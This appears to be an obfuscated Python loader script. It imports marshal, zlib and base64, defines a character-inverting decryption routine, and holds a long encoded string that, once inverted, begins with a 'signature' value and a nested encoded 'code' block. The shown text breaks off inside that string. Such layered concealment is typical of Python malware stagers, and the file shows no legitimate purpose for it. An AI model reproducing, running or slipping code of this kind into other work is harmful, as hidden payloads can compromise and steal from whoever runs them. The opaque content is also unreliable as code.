import marshal
import zlib
import base64
import hashlib
import secrets

def custom_decrypt(encrypted_text):
    decrypted_text = ""
    for char in encrypted_text:
        decrypted_char = chr(255 - ord(char))
        decrypted_text += decrypted_char
    return decrypted_text
code = '\x8c\x96\x98\x91\x9e\x8b\x8a\x8d\x9aßÂßÝ\x9c\x9e\x9dÉÆÌ\x9bÏÉÌ\x9dÌÊÏÎÉÌÈ\x9d\x9eÌÆÎ\x9aÉÌÊ\x99\x9b\x9a\x9d\x9cÉÍ\x9c\x9cËÇÈÌ\x9c\x99\x9eÍ\x9d\x9d\x9bÈÉ\x9d\x9eÆÇ\x9dÆ\x9eËËÍÇ\x9cÏÈÆÝõ\x9c\x90\x9b\x9aßÂßÝÝÝ\x9aµ\x85\x8b§®\x8b\x88©¹¨\x9e\x89\x89\x99Í¶ÊÏ\x92®¾\x88®·\x8eµ\x85Çª\x94\x95\x9dÎ½\xadÌ\x8aº\x8b\x95Í®¶\x98\x97\x85¾Í²\x94ÆµºÏÉÌ\x9a¹Í\x8bÊ¾¦¹ºÎË\x96´\x96\x98¶\x90´\x98¼\x9e¶¼´\x90\x95´\x95°²Ë²È\x8b«¨\x85\x8aÈ©\x9d±«\x8b«\x8b©ªÇ\x91\x9bÎÏ\x87\x92\x8fÉ¥É\x9b\x8e\x8bÏ\x8e\x8d¥\x92\x9eÊÍ·\x9aÐÈÐ\x9b\x8fÆÈÔÆ¶\x9b¾\x93··\x8a§\x8b\x90Ô\x8b\x85ÐÐÇÆÐÐ\x89°\x99Ð\x85\x8a¯\x9aÔËÆ»\x9dÔª··Ç¼È³\x8a¾\x99\xad¯\x99¥Ë\x94\x92\x9e§µª¶\x97´©±\x9e©\x9a\x9d\x8f\x9cÈ\x93¬É\x8fÏÏ°\x93\x9d\x9bÊ°·Ê±Ê\x8c\x8d¶\x8a¨¥±¸¬\x86\x97«\x9d»µ¥ÇÔÊ\xad\xad\x95°´Ô´\x92\x99\x86\x89¨¬Ê\x95\x8a©\x86¨ÌÏÉ´\x9b\x8fº\x9c\x8dÇ¨©\x93\x91¾¯\x92\x96³¹Ô\x90\x91\x96É\x93§¥¦\x93¨\x8e\x87µ\x9cºª\x99\x98\x86\xad¶½Æ¹\x98¥Ë\x94¨Éµµ\xad´\x93\x9b³\x90\x9a¶Ï\x8b¸\x97±\x9a\x95µ³Ï\x86\x90\x94\x91È²Ð¶ªÆÉ½\x8e±Î½®«Ì\x8c¼®Ïµ\x8dÏµÉ·¸®\x9d¶º\x8c»Î½\x8d¶¶\x93\x85±\x98¹µ¼\x8fµ\x92\x94¾Í½¥½¼\x88°\x96\xadµ\x8d\x8d\x9cÎ\x92Éº¯\x85\x9c\x8dÏ¶\x8c\x97¦»Ç\x93¼¬¹¥½\x9c\x95Ç\x94¬\x86¼Ì¸·\x88\x90\xad\x96¨Æ»µµ\x86\x86¹\x90³¬«ª\x94´\x86¼\x8f\x97¶\x87\x98©\x95Î\x87\x9e\x8dª\x8cÎ\xad§ºÈ\x96\x9a¶·\x9c±±Ï\x94\x8c¥¼\x94\x8d·°²µ¬\x85\xad±©\x96º¶Æ\x92\x97\x99\x95É\x9aÏ¼\x87µ\xad\x8bÐ\x8cË\x96µ\x89±\x93¥¬\x85¸»»°ª\x9a¨Ï\x86\x95Ô\x9d¯¦½\x92\x98¾\x9a\x8d\x97°·\x94\xad\x86\x88Æ\x90²\x9c\x90¼¨©\x93\x91º¯\x91\x96³¹Ô\x90\x91\x98\x86¨\x98\x85¬Ç\x90\x90Ç\x93\x8f¶®°\x8f\x96¨\x9b®È\xad\x98½\x94\x8c¯\x88Ì³®Ï\x8d®²\x9c§¾\x8b\x90\x8d\x9a\x8a¹¶\x96É¼Æº\x85\x86\x88¨\x96È\x94³Ï\x95\x8eª¼ª§\x9c\x97\x9a\x91É\xad®±\xad\x9b\x96ºÊ\x9d´½½Î¹É¶\x99\x85½°¶\x8a\x98\x89\xad\x8aÔ\x9c¶\xad±Í¹Éº\x99Ì¼º«\x9b\x97\x9a\x95\x9c\x8a\x88¨\x96È\x94³Ï\x8dÍ¦´\xad±Í¹É´³\x8f¾\x93¹Ì¶\x99\x8eÌª\x88¬\x96È\x94µÏ\x87¬¬½\x8e³\x8c®Ð\x99ºº\x98\x9e\x96Èº´Ï\x9c³\x87½Î¹É³Ð\x9b´\x8b¾Î¹Í¶Ì\x91Ô\x85®±\xad\x9b\x96·\x9e\x8d¾\x93¹Ì¶\x9d\x8d\x8f\xad\x90¸\x90\x8a\x87»Æ\x8bÔ\x8c¹\x90\x8aÊ¼±»\x87\x9e¶°\x90\x8a\xad¯Ô\x95§¼»\x8e³\x94«\x8d\x97\x88\x8bºÌ¦§\x90\x9dÉË«\x96³\x90³Ï\x9e\x9e\x97¾\x93¹Ì¶\x99\x8f\x8f\x96ª»ª§¦\x98\x92\x98\x98µ\xad\x9b\x86·É\x8a\x86´½\x8e³\x8c®\x9d\x99ºµ\xad±Í¹É½Çª\x98\x9e\x96Èº·Î²º\x90\x96É¼Î·\x93«Êµ¾Î¹¨¶È\x89\x92Æ®±\xad\x9b\x96¾\x9dÔ©\x86»\x8e³\x94¬\x99Ô\x8fÎ¾Î¹Í¶»\x89\x93\x89\x98\x9e\x96Èº»ÌÇ¨Ë¸\x90\x8a\x87¾\x9bÐ\x90\x93¾Î¹Í¶·\x89Ï\x89\x98\x9e\x96Èº½Ì\x85¸Ë¸\x90\x8a\x87¾ÆÔ¨\x8a½\x8e³\x8c®©§Ç\x93º·ª§\x90\x8eÐÎ¼\x94«\x9b\x97\x9a\x97\x8b¯\x87\x9a¶\x8a\x98\x89\xad\x8cÐÇ\x8eº·ª§\x90\x97¯Ð¨¬»\x8e³\x94®\x89\x9b¾\x8bºÌ¦§\x90ÆµÇµ\xad±Í¹É´¨\x99¼\x94«\x9b\x97\x9a\x96\x8c\x99\x87¬¶\x8a\x98\x89\xadÈÐÊº¶°\x90\x8a\xad°\x99Æ¨¼»\x8e³\x94«ÐÔ\x8aÇ¹\x90\x8aÊ¼\x9b¯¸¯½´³\x8a®\x89\xad·\x99\x86²®\x9b\xad\x9a\x96ÆÐÎ®¶°\x90\x8a\xad¯Ð\x97½\x88µ\xad\x9b\x86¹\x9eÆ«Í½\x8e³\x8c®Ð\x9a\x93·¾\x93¹Ì¶\x9d\x8dÔ®Ë¸\x90\x8a\x87»\x8b\x8a¬®®\x9b\xad\x9a\x96\x92ÆÇ§\x96³\x90³Ï§ÆÐ©\x86»\x8e³\x94\xad\x8d\x85\x88\x8bºÌ¦§\x90\x8dÆË¬\x96³\x90³Ï¦\x9e\x85¾\x93¹Ì¶\x99\x8e\x99\x9d\x88\x97ºÌ¦©\x90È³\xad¾Î¹Í¶Ð\x8d¥³¶°\x90\x8a\xadµ°\x89¼\x94«\x9b\x97\x9a\x95Ð\x91½¼¶\x8a\x98\x89\xadÎ\x8a²¼ª§\x9c\x97Ô\x8c\x9a\x95¾\x93¹Ì¶\x9d\x8dÈ\x96º»ª§¦\x97É\x91\x97\x9a¶\x8a\x98\x89\xad\x89¦\x9cº\x90\x8aÊ¼\x8b¯\x98¥\x98\x9e\x96Èº»ÌË\x93º»ª§¦\x98°\x99©¶\x98É\x96Êº\x91Æ\x8c\x8dº·ª§\x90\x96²É½´³\x8a®\x89¬\x93\x87\x88¨\x96È\x94³ÏÔ\x8c\x9cº\x90\x8aÊ¼ÆµªÍ\x98\x9e\x96Èº½Ì§´\x97½Î¹É´\x91\x9b\x88\x97ºÌ¦§\x90È¬\x92½\x8e³\x8c®¯\x9e\x9c³\xad±Í¹É´\xad\x92\x98\x9e\x96Èº·ÍÌ¬¬»\x8e³\x94\xad\x91±¾\x8fºÌ¦§\x90\x8b\x87\x90º\x90\x8aÊ¼ÆµÉ\x8b¾\x93¹Ì¶\x99\x8f\x87\x91ª»ª§¦\x95°»\x88\x8bºÌ¦§\x90»\x87Çª\x96³\x90³Ï¬¨\x9d½\x9e³\x8a®\x89«\x89±\x98\x8fºÌ¦§\x90\x86\x98ÎÊº³ÏÆ\x96Ô\x96º¸\x88\x90\x95\x96\x93\x9c¯Ç\x9a»©¬È\x87ËÆ\xadº\x99§\x89Ìº\x95Æ\x9c\x96ª\x90«§¾¾\x91\x98\x8b¥\x98ªË\x85©¶\x98\x91\x98\x9b\xad¾¥\x93\x90ËÐ§\x88¨®\x88§\x90\x9a®¶\x9a\x85\x8e\x95®\x9e\x9d\x97\x8f´\x97\x96µ¾\x89¨\x8b\x8fÏ·¬\x93»Í\x97Ç\x9bÎ\x95¬\x9c\x95º¼É´°\x8f\x8b´\x96\x9c\x95\x9d\x99®\x90\x8f¾¯\xadÏªÎ\x95\x86¯©¶¹\x85¯Æ\x8c\x9a®¸\x8f¶¯\xad¸Ê\x8aÔ®©¬\x94½Ïª·±ËÏ\x95±\x86¹\x9bº\x8dÍÊÉ\xad¥\x86´Æ´»\x90È\x9cÎÌªÈ¸ÍÌ\xad¼¬¾Æ\x97Æ¾®\x86¾\x9a\x92\x97Ï«\x8a\x9eµ\x8fµµ\x92\x9bÉ«\x9d¥Ô\x85Ì\x9b\x93Í¹\x8fµ\x91ËÊª\x8b\x91ËÌ·¥»¶¥\x8dÎ¯¶¹¹\x8cÇ¼\x8c§\x8fÉ\x87Í\x9d\x9d±\x8aÐÌ³È\x86\x93\x87¸»\x8e¨®\x8e\x91\x9c¥\x92\x8e¹´\x9c\x90\x9e¥Ì¬¨®¸Ç\x8b\x9b\x87\x99\x96\x9d\x86¥¥\x86ÐºÐ\x93\x97\x95\x89\x85\x97\x91³Ç³Ô\xad¸\x9c\x89Æ\x8b\xad\x99\x97\x9d\x86Ê¥\x86Ð½Ð\x92\xad\x91³Ç§Ô©¸\x9c\x91ËÌÇ\x9e²È¯\x9c¥¬\x99Ê\x9c\x96\x99ÉÉ\x97\x89\x91\x8c°ÐÔ§\x91Æ\x9b\x9d\x9d¯\x86\x93Ô®±\x87É¹ÍÍ\x99¨±Ë\x9d\x85¼\x87ÌÔ©«\x95\x8c³Ì³¦¨Ô\x86\x88\x8bÇ«\xadÌ\x8e¨°\x9a¼Î\x85\x87¸\x8aÊ\x90ÈË©©°\x92Ç«È\x8a\x9a\x8d©\x98\x8d\x8b\x9d·\x9e»\xadÏ¬¨ª©§Ï\xad\x93ÏÊª\x98µ©Êª\x9d\x8b¨Ç\x88Í¨\x90É»\x8c\x8e¥¥§¾\x8b\x9c\x89´\x8d±µ§°\x99¹\x91¬\x87\x8bºÈ¨§\x90«\x91\x9c·¬\x92Ê¸ÔÊ¨\xad\x87\x89\x97´\x8b\x8cÔ\x98\x9e¨\x8f\x94\x8f\x9b¬\x8b\x8eÌ\x98\x9e\x93«\x89\x8d\x9d\x92¨Ç²±ÌÆ\x91¹\x99\x8fÉ\x9aÆ\x9d§³\x93¥\x8e\x98\x87\xad\x9dÊÊ§\x90±\x88ÐÊ¨Í\x9d´º\x93\x91³È±\x87³·§\x8f¨\x9d\x9b\x8dË·¹\x93Î\x8a\x88®¨±\x8d´Î\x94\x8e\x85\x9b\x8b»¦¨±´Æ«\x8f\x9e\x94¬\x91\x9e¨¹¸\x8f©»\x99\x91ÏÊ§®Î\x9e\x8c\x99¹²¶\x8e±\x94¨ÌÊ¯¦\x91È«§\x8a\x89»°\x9d¯¹°\x8d¶\x8a°Ìµ\x8c\x8cÇ°ºÉ¯Î±ÉÇ\x93ÉÊ\x8c¯É\x9b\x90\x93\x8c\x90¾Ð¾\x93\x9d©\x86¦ÇÊ\x90\x9cÇÉ\x86\x97½½Í\x89¬°É\x8e¨\x94\x85Í¥\x88¥\x92©\x89¶\x93\x98Ì¬¶«\x94Í\x93\x94§\x97\x88ª°½¹\x94¨¨Ë²±Æ\x91¸\x95Ì\x94ª\x8c\x91Ê¥©°\x85\x96\x8a\x9b\x94\x93\x9cÉ±\x9eÆÏ¨\x93È\x8fÆ³\x85¬¸§\x92\x93²Ð±´ÈÇ\x88\x8d\x89¬\x8a\x89±¾\x9a©\x95©µ²\x92¬\x8f\x8f\x9bÍ\x8a\x85¨´Ô\x8bÏ\xad«\x86º¯\x8a¸Í\x9d\x9a¨\x99\x9a\x8aÔ¹\x91¯«¯¦ÉÊÎ»\x92§\x95·«ªÈÊ\x86\x9d\x91·¯\xad\x89¥\x85§Ç\x8cÈ©\x8c\x85\x93¯·§¯¯È³\x87\x85ÎÊ\x9cÆ\x9b\x85\x8dÆ\x92Ì°©Ð\x8d\x97\x8fÈ\x89ÏÉË¯\x8b©\x8b\x95\x99\x89\x92±§\x92\x9e\x89¯¦\x9e±Í\x9e¯Ê\x9b\x8a\x97©\x92¨\x85\x9a\x9b\x92±°¥\x91Ç\x85³\x8dÏË³²\x92\x93¨\x8f³\x9c®Î\x8fË³°¥\x8a\x94\x96\x8f½\x99«\x97¬\x87\x9b\x98\x89\xad¬§¸¸¨¶\x9dÌ\x88Ê¹½É¹Ê®\x91Æ\x9c\x87\x8a\x89\x9d¥Ç¥¸¦±\x90Ì\x9b\x8e´Ï\x9d\x92§ÆÆ\x86È\x9bÆ\x91\x8cÈÇ¬É©©\x90\x99\x85§¬\x9eÈ\x95Æ\x97\x8e\x8a\x88¨¨\x92\x85¨§¨¥\x85ÆÐ\x94±\x96±Í\x92Æ\x8f\x9e\x8c\x90ÎÉ°\x97\x8c\x87±\x8b§¥Í³»Î\x8f\x9e¹\x9b·\x96\x92\x97\x9bµÏ©²¬\x9e¯\x9c¯\x91Æ°\x99µ\x8b¶°Ð´ÊÍ©Ô©¸É\x96\x8e\x8d\x9eÔ·§\x9a\x9a\x9bºµ\x91\x8b¾\x8c\x88¸\x8c·¨\x8b\x96\x9dªÌ¥»©\x8d¥\x9bµ»¼ª¯Í¼«\x87\x9a\x90\x94Ï²ÉÔÌ\x8c\x85É\x97²\x85\x8f½\x94Æ\x8d¸\x9b\x91\x92\x87\x9b¸\x95®\x93\x8bÔ\xad¹°\x90«Ì\x92\x8c\x9a\x8f\x90·°·¨\x88Ì\x8bÉ\x92³\x85\x9a¶Í\x9a\x96\x99\x8e\x9d\x9a¥É³¥\x96Ì\xad§\x8a®Ê\x9d©\x96§\x98Ì¯\x9aÇ\xad¨\x8d\x96Î»¯Ç«\x90§«\x9dÉª\xad\x8b\x9b\x98Ô§»\x89¯\x88\x8eÔ\x89»³º\x8eÎ\x93°±«¬\x91\x9b¼»\x9e¾\x89\x95¨Æ\x91Ìº\x99¥\x8b®Ð\x94\x8a«½Ð¹\x8b¾¥Î©\x8d¸È\x92\x9a\x89¶¦\x85«¨\x8a¥\x8cÔ\x97\x93º»\x8eÌ§\x9cÉ\x8a°\x8c\x87\x96\x9b®\x8f\x91·\x94\x98´²¨\x8fÍÍ\x8b\x8bÔ\x97É\x8d\x9e¹\x9a\x8c§·Î°©\x88\x94\x86Æ§ÈÍ\x9bÎ\x9c³\x9d\x9aÆ\x85¦\x90Ç\x94ÔÇÏÊ©\x8e\x95\x85¨Èª\xad\x95\x99¥Éµ\x96±\x95\x8b\x89\x90¥\x97\x8aÆÌª\x9d\x8d±\x95\x8f\x97\x90Ê²Í°\x92¨\x95·È\x9d\xad°Í\x85Ï«\x97\x89\x9b¦\x8e±\x9d\x9d\x99®\x95±\x8d\x8d±\xad\x8aÔ\x86Ï¦Ð\x9eÉ²\x9b\x8cÆ¸Ë\x9dÐ\x9d\x96±\x99\x8cµ¸\x8bÆ\x89\x90\x95\x96\x87\x9b¯Ë¥¹\x8c¼§««Ð¥\x98¯\x87¯\xad·¹\x98Ï·ÇºÔ\x8a\x8f\x9a¯¼§±Ï\x8b\x92\x8dÈ\x9c·\xad°¦\x85ÏÔ\x92Í°°\x85ÐÌ\x9e\x94\x85\x98Ô\x98«É\x98¯\x9c§\x90©¨\x95\x97¶³\x99®«\x97Ð·Ï®\x9a\x95Æ¨\x94¦\x8d\x99\x9e\x87\x8e\x95Ï»\x90Ð¨\x86\x8c©\x90³¦Ê¨©\x9e¨\x9c\x95\x9b\x97\x95\x8f\x90·ºÍ¦\x95\x89Ë\x96·ÌÍ´\x87É\x87\x97Ç¬¶¹¬¯Í\x9e\x87\x8b±\x9cÇ®\x9a·\x89¼¶\x99\x9aÊ³·³·¯\x99Çª\x95Æ\x98ª\x87¦\x8c¨¶Ð\x9b\x8f¸Ï\x87\x86\x87\xad\x88¦Ç¦\x93ÐÇ\x9c\x94\x9d\x8c\x90\x9c·\x9d¯ÉÉ§É\x8a·Ê¹\x89\x8c¾¥\x99Æ\x8c·\x9d\x87Ê²±\x93»Æ\x8fµÆ¥»ÆÊ\x94\x97\x88\x98«Ê¸»Ê¸\x91\x86»·\x92¨\x9d¼¼·¦¼\x9c½¨\x90\x8fº»\x8f¯\x91Ï²\x8a\x95Ì²\x89\x91·\x9cÇ§\x85°\x9c\x85³\x85\x92\x9a¥\x87\x85\x95Ð¾\x89¶·Ô\x99Çº\x9a\xad\x99\x9b\x8a\x86\x99«\x85\x96\x9a¹Ê\x85\x94Ð¶\x89¶\x89Ç³Ê\x90ËÈ\x91«\x9a\x9dÔÐ\x93§°\x89Ë\xadÇµÔ\x9a¯°\x99\x87È¼¯\x94\x8aÍ\x86Ë\x94ÎÆÆ\x9b\x86µÐ\x96Ð··\x94§Ô¯Ç\x86Ç\x96\x99Ê\x89\x88µ\x97ÈÔÎ\x86³Ð°Ô¥°°\x9a³Í¼Ð½\x8a\x9c\x99\x87§Ê±\x85\x91\x99É\x9e\x96Ð\x86Î·\x99´\x9a«¯\x9c¯ËÎÊ²Æ\x86Ð\x95«\x86Ê\x85\x95Ð°\x89µ\x89\x9c\x99Ë±Ê±Ð\x92Ðµ\x89¶\x89Ç¯Ê²ËÈË\x91·¨ÏÐ\x87\x85\x86Ê\x87Ì\x8b\x8aÇ»Ê\x8bÊ½Ð\x93Ð±\x89¶ÌÔ\xadÇÔÇ\x98Ð\x87È\x91\x85\x86¯Ð¯\x8a\x9c\x89¶¯Ô½¾ÐÆ³\x95\x89Ê\x92Î\x99Ç\x8aÇ\x8bÐ\x96Ðº¨\x9cÍ\xadÉ\x96³Æµ\x9bÆ¸©\x9e¬\x86Ð®ÇÐ®\x9bÔ\x95¥Æ\x96ÇÉ\x94ÊÔ\x97¥\x9a\x90\x9eÔ¬\x9bÔ\x98\x8dÆ¯«Æ»©É\x96\x91\x9d\xad«\x89\x90\x8e\x99¦§°\x8f\x86\x9a¥È\x98\x93É\x91½É\x95\x8cÔ\x96Æ\x8d°\xad²Ô\x96ÉÆ¬ºÐ¨ÌÇ\x8d¸Ô\x91\x8bÏ\x91¯¥\x8bÌµª¯Î\xadË\x8e\x89·Ð·\x8bÇª\x99Í\x8bÇ¨\x97Í«»\x93Ë\x97¬Í\x98\x85º\x8a\x91½\x8b\x93»´\x96\x9e¹ºÇ\x93\x90\x98\x95°\x9d\x96¼\x97\x93¯µ\x86±¥ª\x8b»\x8e\x9a¾\x8e¨\x86\x9b®ÏÉ»¨\x8b©Ç§\x97Ï\x86ªÊ\x9e\x93Ï\x8d¸\x9b¬\x96É«»\x9a\x85\x99©§\x97¸¶Ï¼Ï\x9e\x87·¦\x94\x93¸½¹\x9e·Æª¦\x8b\x89\x96±\x92¸\x90É\x92\x92\x92¶µ\xad\x89\x8e\x9d\x9b¥\x8f²\x8b\x95»´\x8aËÈ\x8a«¶\x9e´Ï\x8b\x9a»ªÐ\x97\x8e\x9a\x95\x90\x94\x8c\x86·½©Æ\x9a\x93®»§½\x9eÔ²\x96ÇÏ§ÏÏ´\x87ª\x89\x86ÈÈ¹\x95\x93Æ¹Î»»·º\x8d\x8f\x9e«\x93´¥\x8aµªÏ\x94\x99\x94¨\x8f\x8d\x9e»\x86¨«\x89¥µ¬\x9e§Ô\x8e\x92Æ\x94\x99\x8f«\x89ÈªÆÌ\x88Ð\x93\x96É°ÉÆ¬\x9d\x95»Îª©\x92\x93Î¶Ï\x8cª\x9b©¯«\x87ÊÉ\x95\x91Ì\x9dÍ\x99\x9a\x98Í\x8b\x89\xad\x8f\x99\x9d\x8a¯\x8b\x95È\x87»±\x8eÈÈ·§Î«\x8d¥Æ\x94Ë\x9a«\x97\x93ËÍ§\x9c\xad\x89µ\x9a·\x98\x88\x97\x8bÏ\x92µ\x8f\x86\x86ÍÈÊ´¬Ï«\x9aÊªÍ\x92«\x90\x97ª\x97ÈË±\x93\xadÏ\x8b\x89\x8fÏÎ¼ÍÌ\x9e\x8bµÎ\x9bµ¥¥ªÌÆ¥ËÆ\x8aÔ\x85\x95ÊÐ²ÈÊ¥ÐÍ¸µÆ¸¬²¯\x86µ\x8f½¥¯µ®Ì\x99»\x95Í¬\x8f¶¥\x89\x9e\x85¬©\x9e»¼Ç\x86ª\x98«\x87ª²±¥\x87©»\x9d\x95©\x94\x9a\x93\x9d¬\x9dÍº\x8cÉ³°\x9a©ÍÐ¶\x95\x9d\x89¾¼«\x95Ì¶\x9c\x94½\x8aª®°\x86\x89\x8f\x8b\x94\x8a²\x9c¾\xad\x95\x88¥\x99Î\x9b\x86\x97µÍÆ\x86¹¹\x8f©Ì\x92©\x9bË\x93\x8bÏ\x92\x9b¬\x97µ°\x9e\x86\x98Ë\x95\x8d\x85\x92°¸\x8e«\x92\x9bÇ\x9a\x9d¶\x8cÐ¨\x9e\xadÊ\x85\x9e\x9b\x86\x86®¾Ç\x8cË\xadÍ\x97·\x87\x8d\x9b¾\x97³\x8e¼\x85\x9b¶¸§¯¬Ë\x86§²\x8e\x9c\x8f\x85²²©ÆÏ¶\x86½«¶\x92Ç\x8b\x85µÍ\x9d\x96\x91\x9e«¦\x95\x89\xad\x8e¬¸\x94\x95¨\x98®\x87É¥\x87\x90Ç«¦¯\x89´\x9c¼\x8cÔÍ³Ì\x92ÆÌ\x89ÆÌ«ÏÈ¹°È\x85\x85¯\x86ª\x8e\x95¦¼°É\x98\x8b\x9d©É\x99º\x9a¼É\x8d\x90´¦\x99·¸\x92Í\x91²Ç±¨Íµ¼\x92³\x8eª\x9d\x8dË\x8f\x90¥¯\x88\x86´\x90¬\x86\x9e¥\x91\x97\x8d\x88Ì¨±¶ª§··\x98\x92¹²´½\x92\x9c\x96\x8c\x8eµ\x9a¯È¶¹¾\x93¸³\x90¾\x96Í\x90Ê\x96Í\x8eµ\x8dº±\x9d¨\x95Í\x8e\x8e\x8d\x9dÉ±ÏÌ\x9d\x90\x94Ê¬ªÔ°\x88ÌÌ¬\x99ÉÐÉ\x98ÔÉ°\x9a¾\x85Ï\x9b\x9e\x89\x9a\x9d¯\xadÌ²\x8b\x88\x89\x8c\x9aÊ¦\x8f\x8e\x94¹«\x9a\x85\x8f\x8eÌÇ¸Ï\x9aÐ\x9dÍÈ°È¥ÇÐ±«ÊÌ\x8dÍ\x9bÎÆ®ÍÆ¬\x9a¯\x9b\x93Í\x8c®µ®\x92\x98\x92Ô\x85\x99¶\x8a½\x93§\x96¨\x87µ³ª\x8dÍÎ¬±Ï¦«Ô\x91\x8e\x89¬¹\x99¸\x93½±\xadÇ¹«¯¯Ë¬\x93\x95µ·©ªµ½ÇÏ½µ\x95²\x9c¦¸\x8f\x9e\x8a¾\x91¥°©\x93Í\x99¼Ç\x94º\x85\x8c´\x8c¾Î±¦´\x97§\xad¥\x95µ\x96¨»Í±ª«Í\x9c\x8f»ª\x8f¹\x8cÔ\x9e²¸°«\x90\x9a¹É¼¼\x87¹\x90¾½®°\x97\x87ÍÏ\x99¸¶\x86\x88µ\x8a\x9d\x95\x86Ì¯\x90\x9c\x91\x8e»\x9a¯\x8aÈ\x8f\x9b\x86\x8f\x86Ï²\x9a\x8aÍ\x96\x98º©´\x95©\x8b³\x87\x93¾³\x9e\x98²\x8cÉ\x94°µÍ¥¼\x88\x88¥\x94\x9c«\x87Ì\x93º\x9c\x89§¬\x8b\x93\x95\x88Ê½\x9d\x8e\x97Ç¶½¨\x94\x9bÐ¾´\x93\x89²º\x92\x88º\x88É\x89\x99\x93¾\x98ª¥\x90\xadº»\x9dÆ»\x8b°¥¼\x98§\x93\x8d³\x8c¥´\x8a\x97É\x8e¸»´\x96\x8e¹\xad\x85©\x8c\x90¸\x95°\x8f\x9c\x8d\x8dÔ¬Í\x97\x88ÍÇ\x87Ë\x85\x91\x86\x8c°\x86Ë\xad\x96¦\x87\x99®Í\x8d\x8d¶\x96¨\x86¶Ï\x9bº¾Ô³\x8a¯´´\x88\x99\x9aË¸¨§¨Ð\x88\x96©È®®¨Æ·¼ÏÔÔ\x99°\x8a·\x8c\x90\x89\x94ÉÌ°·\x90²»²ÉµÎ¥ÊÍ\x88Ç\x93ÊÎ\x90¹½Ð³É¨\x8c\x97\x91\x9c\x9c«È¨²\x95\x85ÌÉ¦Ë\x93º\x9d\x92©\x9a³©Ë\x9e\x93½\x99§\xad¨´¨\x99ÆÆ±\x92\x95Ç\x87½³\x94\x92\x85\x93\x87·Í\x93Ì²©¨Ï\x9e«¬É\x9b¸ª³\x8d\x9e°\x9e\x97È±Í\x86·\x8bª\x8b\x8eª\x8f³\x9b±\x85\x8e\x86§\x8c¯\x89\x85\x91\x9c\x8f\x8e\x9aÆ\x90Ç\x91\x9dË\x8a\x96¸ÈÊ³\x92Ð¬ÌÎ\x92\x94Ô«¸Í\x98«¦\x89\x9e¸Æ\x99\x95¯º\x8c¨\x8f²¸¸¹±\x88\x96Î³\x90\x8b\x96®\x89\x98±§§»\x8a¾\x95\x88ÇÇ\x89ÔÏ©\x8d\xadÍº¾º\x9e\x88¬Í®¹\x97\x9eÍ\x94\x8b\x8a\x87\x91¨µÇÔµ\x87\x8a\x89¼Ï\x9c¬Ç\x86\x9b\x8b¼ÈÐ§\x95\x95\x8b³\x8c\x93Î\x9b°Ï\x8fÆ¼\x9c\x97´¬®Ê¾Ç»\x87\x93\x88\x95\x93´·\x8f\x8a\x8f\x88\x8bÊ»\x9a\x93Ï\x99¨\x88\x9eÏË²\x8b\x90\x89\x93Ô\x94\x9dÇ\x8a\x98\x9bË®\x9d\x8a´¸«\x8e\x8a«\x86\x92·\x8c\x96\x95\x9bÊ¾Ì\x8f\x95\x9b\x9d¨È\x8e³¸ÆÏ²È¸É\x98±\x91·Í¼ª\x96\x9a\x86¦Ï¸¥\x97\x86»Ê·©\x98¼Ë\x9e¦ÌÆ\x9e\x92Ë¨\x97\x8f\x9a\x97´\x88\x9b§Í¨Ë·\x99\x88©Ë¼\x96¸Ê¶Ì¶\x9a\x91\x97ª¦²©®ÌÔ\x88³\x86\x8eÆ½\x86\x96ËÎª\x8a\x99´\x9e¼§Ð\x95\x94\x94\x8f\x86¾Ê\x87\x85²\x9e°¯©®¶\x99±\x90Æ°ÏÇÈ\x8bÉ\xad\x86É¶\x9d\x9aÐ\x8bÏ¹Í\x89»¨\x9d\x88\xad\x94\x96\x98\x89\x8b\x8fÆ§\x9b°·\x86\x99\x8f¾Ô¼\x8c\x94\x9d\x8a¥\x97\x89ÊÏ\x92\x8a³±Ìµ¶Ð\x94\x85\x90¸¶ÊÆ\x8b´\x89¾\x94¨¾\x9a\x89\x91´\x94·¸®\x9b¦Ï\x8d®ÎµÐÐ½\x95Ç°«\x8cÐ©´\x85\x95¥\x97¹Í®\x94\x9e\x98\x8a¨©\x8d\x8f»Ê´\x94Ç¥\x98ÇÎ\x8e\x85±\x9eËÌ\x97\x9b\x93Í\x90Íµ\xad¬\x85\x97\x92½½¯±Ïª\x98\x86¸\x90\x91\xad\x97·\x93³\x95³\x99²\x9a¶\x9d¥¥\x86\x95\xad°¯¹ªÌ§\x94§»\x91Ð\x96\x87Æº\x9aµ\x8c©\x8d¹Î\x99©\x87Ô¯²\x92·°\x9eÆÉ¹¸¾°¦µÉ¹\x96¬¯º®°´\x98¹\x99\x96©\x85\x8e\x87\x86\x92Ð»\x9c\x87°È\x9aÐË\x89Ï´\x86\x92\x9e¯¦\x9a»\x94ÉÊ\x90\x98\x94\x9a¨\xadÊ\xad\x8e\x94ÊÔ\x96\x86\x95Í³\x8aÌÊ´\x92¶\x95Î´Æ\x97\x91\x9b°¬\x88§\x8a\x86\x99§\x9e·º\x88\x88Ô¬´§¨ÌÏ²¨¼ÏË«\x9c±¨ÊÎ\x9d\x91±¯Í¥\x8d·Ë\x92\x95\x85\x99\x94\x9e¥Ðµ\x90\xad®\x8c\x9cÍ\x85\x99¾\x97\x8a©ÇÈ\x97\x8d¦\xad\x8a®¯¨\x87\x95\x8c\x8d\x8a\x91Ð©ËÎ½\x9b²¸Í\x88\x88\x99ÔÐ»«\x94Ç\x9a\x99©\x8b\x92°\x97Ç\x93\x8a\x88\x97µ\x85\x9c¯\x8a\x86\x8aÍ\x9cÐÍÇ½Ï\x91Î°ÈÌÔ\x94Ê\x88²\x8e\x9aÉ\x85\x92\x98Æ\x8fËÇ\x8d\x9cÊ«ª\x85»¥\x8e³Î·¯\x8a\x85\x91§ÎªÎÊ°\x92\x8f¶¥\x91É³\x8d³\x89ÆÎ\x92\x9bÈ¨\x8e\x8eÌ½®\x9b\x9d\x85\x9b¹\x87\x85Ê\x96Ì\x88Ð¦ÆÌ\x8b\x8eÉ\x98\x9d¶¦\x91¨\x96·Ç\x9eÊ\x91\x8dÎ\x8eÆ\x87\x92Í¦«¶¹È\x9c\x85§©\x98§²\x85\x94\x96©Í¨\x87¾Í\x9aÐ¼©«§ÌÔ\x92\x86\x91\x9b®¾´\x9b¹Æ\x98\x89\x8d°\x86·¦\x87\x8b\x97ÊÎ¦\x85\x87Ê©«\x9aÎ\x91\x88®\x8a\x86\x94\x91\x8b\x8bµ\x9bÐ³\x9a¯¶\x87¨\x89\x91\x94Î¾\x8a\x99\x91»\x90¬·»\x9a\x8fËµÐ\x9a\x90Ì\x8c³¥ÏË\x9e\x87Ç\x88\x99ÔÏ·¨´\x99¥Æ\x93Î§Ì½µ\x8d°Î¯\x8b\x8a½\x